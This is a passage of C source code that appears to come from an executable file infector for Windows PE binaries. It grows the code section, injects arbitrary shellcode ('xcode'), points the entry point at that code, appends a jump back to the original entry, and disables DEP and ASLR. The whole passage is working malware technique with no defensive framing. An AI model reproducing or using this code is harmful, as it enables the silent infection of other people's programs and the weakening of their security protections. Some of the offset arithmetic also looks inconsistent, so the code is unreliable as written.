		memcpy(codeSect->data + injection_xcode_offset - 1, mov_eax_bytecode, sizeof(mov_eax_bytecode));
		memcpy(codeSect->data + injection_xcode_offset - 2 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
		memcpy(codeSect->data + injection_xcode_offset - 2 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
		memcpy(codeSect->data + injection_xcode_offset - 3 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point) + sizeof(jmp_eax_nop_bytecode), threadfunc_prologue, sizeof(threadfunc_prologue));
		memcpy(codeSect->data + injection_xcode_offset - 4 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point) + sizeof(jmp_eax_nop_bytecode) + sizeof(threadfunc_prologue), xcode, xcode_size);
	} else {	
		memcpy(codeSect->data + injection_xcode_offset, xcode, xcode_size);
		memcpy(codeSect->data + injection_xcode_offset + xcode_size, mov_eax_bytecode, sizeof(mov_eax_bytecode));
		memcpy(codeSect->data + injection_xcode_offset + xcode_size - 1 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
		memcpy(codeSect->data + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
	}
	
	return 0;
}

int pe64_infect_resize_section(pe64_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size) {
	if (!nt_header || !sections || !xcode || *xcode == '\0') {
		return -1;
	}
	
	//search first code sections and nearest section in virtual space
	list_pe_section_t codeSect = NULL;
	list_pe_section_t nearSect = NULL;
	list_pe_section_t curSect = sections;
	
	while (curSect) {
		if ((curSect->header.Characteristics & SECTION_CHARACTER_EXECUTABLE) && !codeSect) { //that section is code section
			codeSect = curSect;
			curSect = sections;
			continue;
		}
		
		if (codeSect && curSect != codeSect) {
			uint32_t edge = P2ALIGNUP(codeSect->header.Misc.VirtualSize + codeSect->header.VirtualAddress, nt_header->nt_optional_header.section_alignment);
			
			if (!nearSect) {
				nearSect = curSect;
			} else {
				if ((curSect->header.VirtualAddress - edge) < (nearSect->header.VirtualAddress - edge)) {
					nearSect = curSect;
				}
			}
		}
		
		curSect = curSect->next;
	}
	
	if (!codeSect) {
		//that file is not contain code section (is it possible?)
		return -2;
	}
	
	//resize code sect
	uint32_t newVirtualSize = P2ALIGNUP(codeSect->header.Misc.VirtualSize + xcode_size + 016, nt_header->nt_optional_header.section_alignment);
	uint32_t newRawSize = P2ALIGNUP(codeSect->header.SizeOfRawData + xcode_size + 0x16, nt_header->nt_optional_header.file_alignment);
	
	if ((newVirtualSize + codeSect->header.VirtualAddress) > nearSect->header.VirtualAddress) {
		//not possible for resizing section
		return -3;
	}
	
	uint32_t injection_xcode_offset = codeSect->header.SizeOfRawData;
	uint32_t diff_rawSize = newRawSize - codeSect->header.SizeOfRawData;
	codeSect->header.Misc.VirtualSize = newVirtualSize;
	codeSect->header.SizeOfRawData = newRawSize;
	codeSect->data = (char*)realloc(codeSect->data, codeSect->header.SizeOfRawData);
	
	if (!codeSect->data) {
		//cannot allocate memory for new data
		return -4;
	}
	
	//align another sections (if it need)
	curSect = sections;
	while (curSect) {
		if (curSect->header.PointerToRawData > codeSect->header.PointerToRawData) {
			curSect->header.PointerToRawData += diff_rawSize;
		}
		
		curSect = curSect->next;
	}
	
	//inject xcode
	uint64_t original_entry_point = nt_header->nt_optional_header.address_of_entry_point + nt_header->nt_optional_header.image_base;
	char mov_rax_bytecode[] = "\x48\xb8";
	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF,
										(char)(original_entry_point >> 32) & 0xFF, (char)(original_entry_point >> 40) & 0xFF, (char)(original_entry_point >> 48) & 0xFF, (char)(original_entry_point >> 56) & 0xFF };
	char jmp_rax_nop_bytecode[] = "\xff\xe0\x90\x90\x90\x90";
	
	//new entry point
	nt_header->nt_optional_header.address_of_entry_point = codeSect->header.VirtualAddress + injection_xcode_offset;
	
	fprintf(stdout, "original entry point 0x%16lX\n", original_entry_point);
	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
	
	DISABLE_DEP_ASLR
	
	fprintf(stdout, "dll_characteristics 0x%04X\n", nt_header->nt_optional_header.dll_characteristics);
	
	//xcode injection
	memcpy(codeSect->data + injection_xcode_offset, xcode, xcode_size);
	memcpy(codeSect->data + injection_xcode_offset + xcode_size, mov_rax_bytecode, sizeof(mov_rax_bytecode));
	memcpy(codeSect->data + injection_xcode_offset + xcode_size - 1 + sizeof(mov_rax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
	memcpy(codeSect->data + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_rax_bytecode) + sizeof(hex_original_entry_point), jmp_rax_nop_bytecode, sizeof(jmp_rax_nop_bytecode));
	
	return 0;
}
